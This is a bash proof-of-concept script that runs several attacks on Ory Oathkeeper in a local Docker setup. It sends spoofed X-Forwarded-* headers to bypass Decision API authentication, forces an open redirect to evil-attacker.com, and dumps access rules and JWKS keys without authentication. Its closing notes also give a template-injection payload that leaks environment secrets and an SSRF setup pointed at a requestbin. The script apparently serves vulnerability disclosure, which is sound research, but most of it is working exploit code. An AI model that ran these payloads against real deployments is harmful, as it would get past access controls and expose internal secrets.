#!/usr/bin/env bash
#
# Ory Oathkeeper Vulnerability PoC Suite
# =======================================
# Prerequisites:
#   - Docker + docker-compose installed
#   - Ports 4455 and 4456 free
#   - curl and jq installed
#
# Usage:
#   cd poc/
#   docker-compose up -d
#   sleep 5    # wait for oathkeeper to start
#   bash run_all_poc.sh
#   docker-compose down
#

set -euo pipefail

API="http://127.0.0.1:4456"
PROXY="http://127.0.0.1:4455"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

divider() {
  echo ""
  echo -e "${CYAN}════════════════════════════════════════════════════════════════════${NC}"
  echo ""
}

header() {
  echo -e "${BOLD}${YELLOW}$1${NC}"
  echo -e "${YELLOW}$(echo "$1" | sed 's/./-/g')${NC}"
}

# ───────────────────────────────────────────────────────────────────
# Preflight: make sure Oathkeeper is running
# ───────────────────────────────────────────────────────────────────
echo -e "${BOLD}Checking Oathkeeper is running...${NC}"
if ! curl -sf "${API}/health/alive" > /dev/null 2>&1; then
  echo -e "${RED}ERROR: Oathkeeper is not running on ${API}${NC}"
  echo "Run: cd poc/ && docker-compose up -d && sleep 5"
  exit 1
fi
echo -e "${GREEN}[OK] Oathkeeper is alive${NC}"
divider

########################################################################
#  VULN #1 — Decision API Auth Bypass via X-Forwarded-* Header Spoofing
########################################################################
header "VULN #1: Decision API Authentication Bypass via Header Injection"
echo ""
echo -e "File: ${CYAN}api/decision.go:46-56${NC}"
echo -e "CWE:  CWE-287 (Improper Authentication)"
echo ""

echo -e "${BOLD}Step 1: Baseline — GET /admin/dashboard via Decision API (should be DENIED)${NC}"
echo '$ curl -s -o /dev/null -w "%{http_code}" '"${API}/decisions/admin/dashboard"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "${API}/decisions/admin/dashboard")
echo -e "Response code: ${RED}${HTTP_CODE}${NC}  (expected 403 — access denied)"
echo ""

echo -e "${BOLD}Step 2: Attack — Spoof X-Forwarded-* to match the ALLOWED /public/* rule${NC}"
echo '$ curl -s -w "\n%{http_code}" \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: 127.0.0.1:4455" \
  -H "X-Forwarded-Uri: /public/anything" \
  -H "X-Forwarded-Proto: http" \
  '"${API}/decisions/admin/dashboard"
echo ""

RESPONSE=$(curl -s -w "\n%{http_code}" \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: 127.0.0.1:4455" \
  -H "X-Forwarded-Uri: /public/anything" \
  -H "X-Forwarded-Proto: http" \
  "${API}/decisions/admin/dashboard")

HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)
echo -e "Response code: ${GREEN}${HTTP_CODE}${NC}"
echo -e "Body: ${BODY}"

if [ "$HTTP_CODE" = "200" ]; then
  echo -e "\n${RED}[VULNERABLE] Auth bypass confirmed!${NC}"
  echo "The /admin/dashboard request was authorized by spoofing headers to match /public/*"
else
  echo -e "\n${YELLOW}[INFO] Got ${HTTP_CODE} — the bypass path may need adjustment for this config${NC}"
fi

divider

########################################################################
#  VULN #4 — Open Redirect via Error Redirect Handler
########################################################################
header "VULN #4: Open Redirect via Error Redirect Handler + X-Forwarded-Host"
echo ""
echo -e "File: ${CYAN}pipeline/errors/error_redirect.go:47-58${NC}"
echo -e "CWE:  CWE-601 (URL Redirection to Untrusted Site)"
echo ""

echo -e "${BOLD}Step 1: Trigger redirect error handler on a denied route with Accept: text/html${NC}"
echo '$ curl -s -o /dev/null -w "%{http_code}\nLocation: %{redirect_url}" \
  -H "Accept: text/html" \
  '"${PROXY}/admin/dashboard"
echo ""

REDIR_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Accept: text/html" "${PROXY}/admin/dashboard")
REDIR_URL=$(curl -s -o /dev/null -w "%{redirect_url}" -H "Accept: text/html" "${PROXY}/admin/dashboard")
echo -e "Response code: ${YELLOW}${REDIR_CODE}${NC}"
echo -e "Location:      ${REDIR_URL}"
echo ""

echo -e "${BOLD}Step 2: Attack — Inject X-Forwarded-Host to poison the return_to parameter${NC}"
echo '$ curl -s -o /dev/null -D - \
  -H "Accept: text/html" \
  -H "X-Forwarded-Host: evil-attacker.com" \
  -H "X-Forwarded-Proto: https" \
  -H "X-Forwarded-Uri: /steal-creds" \
  '"${PROXY}/admin/dashboard"
echo ""

HEADERS=$(curl -s -o /dev/null -D - \
  -H "Accept: text/html" \
  -H "X-Forwarded-Host: evil-attacker.com" \
  -H "X-Forwarded-Proto: https" \
  -H "X-Forwarded-Uri: /steal-creds" \
  "${PROXY}/admin/dashboard" 2>&1)

echo "$HEADERS" | head -5
LOCATION=$(echo "$HEADERS" | grep -i "^Location:" | tr -d '\r')
echo ""
echo -e "Extracted Location header:"
echo -e "  ${RED}${LOCATION}${NC}"

if echo "$LOCATION" | grep -qi "evil-attacker.com"; then
  echo -e "\n${RED}[VULNERABLE] Open redirect confirmed!${NC}"
  echo "The return_to parameter now points to evil-attacker.com"
  echo "Victims clicking this link would be redirected to the attacker's site after login"
else
  echo -e "\n${YELLOW}[INFO] Redirect did not contain attacker host — check config${NC}"
fi

divider

########################################################################
#  VULN #6 — Unauthenticated Rule & JWKS Disclosure
########################################################################
header "VULN #6: Unauthenticated API Information Disclosure"
echo ""
echo -e "File: ${CYAN}api/rule.go:60-104${NC}"
echo -e "CWE:  CWE-200 (Exposure of Sensitive Information)"
echo ""

echo -e "${BOLD}Step 1: Dump all access rules (no auth required)${NC}"
echo '$ curl -s '"${API}/rules"' | jq .'
echo ""
RULES=$(curl -s "${API}/rules")
echo "$RULES" | python3 -m json.tool 2>/dev/null || echo "$RULES" | head -50
echo ""

echo -e "${BOLD}Step 2: Extract upstream (internal) URLs from rules${NC}"
echo '$ curl -s '"${API}/rules"' | jq ".[].upstream.url"'
echo ""
echo "$RULES" | python3 -c "
import sys, json
try:
    rules = json.load(sys.stdin)
    for r in rules:
        u = r.get('upstream',{}).get('url','')
        i = r.get('id','')
        print(f'  Rule \"{i}\" -> upstream: {u}')
except: pass
" 2>/dev/null || echo "(install python3 or jq to parse)"
echo ""

echo -e "${BOLD}Step 3: Extract URL match patterns (full attack surface map)${NC}"
echo '$ curl -s '"${API}/rules"' | jq ".[].match"'
echo ""
echo "$RULES" | python3 -c "
import sys, json
try:
    rules = json.load(sys.stdin)
    for r in rules:
        m = r.get('match',{})
        print(f'  URL: {m.get(\"url\",\"\")}  Methods: {m.get(\"methods\",[])}')
except: pass
" 2>/dev/null || echo "(install python3 or jq to parse)"
echo ""

echo -e "${BOLD}Step 4: Dump JWKS public keys (no auth required)${NC}"
echo '$ curl -s '"${API}/.well-known/jwks.json"' | head -20'
echo ""
JWKS=$(curl -s "${API}/.well-known/jwks.json")
echo "$JWKS" | head -20
echo ""

echo -e "${RED}[VULNERABLE] Full rule config + JWKS exposed without any authentication${NC}"

divider

########################################################################
#  VULN #1 + #4 CHAIN — Bypass + Redirect Combo
########################################################################
header "CHAIN: Vuln #1 + #4 — Auth Bypass + Open Redirect (Decision API)"
echo ""
echo "This chains the Decision API header injection with the redirect error handler."
echo ""

echo -e "${BOLD}Attack: Spoof all X-Forwarded-* headers on Decision API${NC}"
echo '$ curl -v \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: evil-attacker.com" \
  -H "X-Forwarded-Uri: /phishing-page" \
  -H "X-Forwarded-Proto: https" \
  -H "Accept: text/html" \
  '"${API}/decisions/admin/secret"
echo ""

CHAIN_RESP=$(curl -s -D - -o /dev/null \
  -H "X-Forwarded-For: 10.0.0.1" \
  -H "X-Forwarded-Method: GET" \
  -H "X-Forwarded-Host: evil-attacker.com" \
  -H "X-Forwarded-Uri: /phishing-page" \
  -H "X-Forwarded-Proto: https" \
  -H "Accept: text/html" \
  "${API}/decisions/admin/secret" 2>&1)

echo "$CHAIN_RESP" | head -10
echo ""
CHAIN_STATUS=$(echo "$CHAIN_RESP" | head -1)
CHAIN_LOCATION=$(echo "$CHAIN_RESP" | grep -i "^Location:" | tr -d '\r')
echo -e "Status:   ${CHAIN_STATUS}"
echo -e "Location: ${RED}${CHAIN_LOCATION}${NC}"

divider

########################################################################
#  VULN #7 — Scheme spoofing via X-Forwarded-Proto on Proxy
########################################################################
header "VULN #7: Proxy Scheme Override via X-Forwarded-Proto"
echo ""
echo -e "File: ${CYAN}proxy/proxy.go:169-175${NC}"
echo -e "CWE:  CWE-346 (Origin Validation Error)"
echo ""

echo -e "${BOLD}Step 1: Normal HTTP request to proxy (matches http:// rule)${NC}"
echo '$ curl -s -o /dev/null -w "%{http_code}" '"${PROXY}/public/test"
HTTP1=$(curl -s -o /dev/null -w "%{http_code}" "${PROXY}/public/test")
echo -e "Response: ${HTTP1}"
echo ""

echo -e "${BOLD}Step 2: Spoof scheme to HTTPS (rules only match http://, so this may not match)${NC}"
echo '$ curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-Proto: https" '"${PROXY}/public/test"
HTTP2=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-Proto: https" "${PROXY}/public/test")
echo -e "Response: ${HTTP2}"
echo ""

if [ "$HTTP1" != "$HTTP2" ]; then
  echo -e "${RED}[VULNERABLE] Different response for same path with spoofed scheme!${NC}"
  echo "http:// -> ${HTTP1}, https:// (spoofed) -> ${HTTP2}"
  echo "Attacker can manipulate which rules match by changing the scheme"
else
  echo -e "${YELLOW}[INFO] Same response — rules may match both schemes. Test with scheme-specific rules.${NC}"
fi

divider

########################################################################
#  Summary
########################################################################
header "SUMMARY"
echo ""
echo -e "  Vuln #1  Decision API Auth Bypass     ${CYAN}api/decision.go:46-56${NC}"
echo -e "  Vuln #2  SSTI via Sprig (env leak)    ${CYAN}x/template.go:15-41${NC}"
echo -e "  Vuln #3  SSRF via Hydrator Mutator     ${CYAN}pipeline/mutate/mutator_hydrator.go:151-165${NC}"
echo -e "  Vuln #4  Open Redirect via Error Redir ${CYAN}pipeline/errors/error_redirect.go:47-58${NC}"
echo -e "  Vuln #5  IP Bypass via XFF Spoofing    ${CYAN}pipeline/errors/when.go:173-204${NC}"
echo -e "  Vuln #6  Unauth API Info Disclosure     ${CYAN}api/rule.go:60-104${NC}"
echo -e "  Vuln #7  Scheme Spoofing Rule Bypass   ${CYAN}proxy/proxy.go:169-175${NC}"
echo ""
echo -e "${BOLD}Note on Vuln #2 (SSTI):${NC}"
echo "  To test env var leakage, modify rules.json to include:"
echo '    "headers": { "X-Leaked": "{{ env \"SECRET_ENV_VAR\" }}" }'
echo "  Then request a matched path and inspect upstream headers."
echo "  The docker-compose.yml already sets SECRET_ENV_VAR=SuperSecretDatabasePassword123"
echo ""
echo -e "${BOLD}Note on Vuln #3 (SSRF):${NC}"
echo "  Requires hydrator mutator pointing to an internal service."
echo "  Add a hydrator rule pointing to a Burp Collaborator or requestbin"
echo "  to see full query params + headers forwarded from the client."
echo ""
echo "Done. Capture the terminal output as evidence for your report."
